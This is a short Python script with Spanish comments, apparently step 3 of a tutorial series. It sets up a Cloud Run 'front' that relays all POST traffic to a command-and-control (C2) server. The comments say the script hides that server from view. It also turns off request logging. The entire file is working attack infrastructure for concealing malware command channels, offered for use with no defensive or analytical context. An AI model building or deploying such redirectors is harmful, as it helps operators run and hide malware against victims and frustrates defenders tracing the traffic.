# redirector.py — Paso 3: el mismo frente del Paso 2, listo para Cloud Run.
import os, urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler

C2 = os.environ.get("C2_URL", "https://TU-C2.run.app")  # el C2 en Cloud Run, escondido detrás
PUERTO = int(os.environ.get("PORT", 8080))

class Frente(BaseHTTPRequestHandler):
    def do_POST(self):
        cuerpo = self.rfile.read(int(self.headers["Content-Length"]))
        req = urllib.request.Request(C2 + self.path, data=cuerpo,
                                     headers={"Content-Type": "application/json"})
        respuesta = urllib.request.urlopen(req, timeout=5).read()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(respuesta)

    def log_message(self, *args):
        pass 

print(f"Frente en :{PUERTO} → reenviando a {C2}")
HTTPServer(("0.0.0.0", PUERTO), Frente).serve_forever()
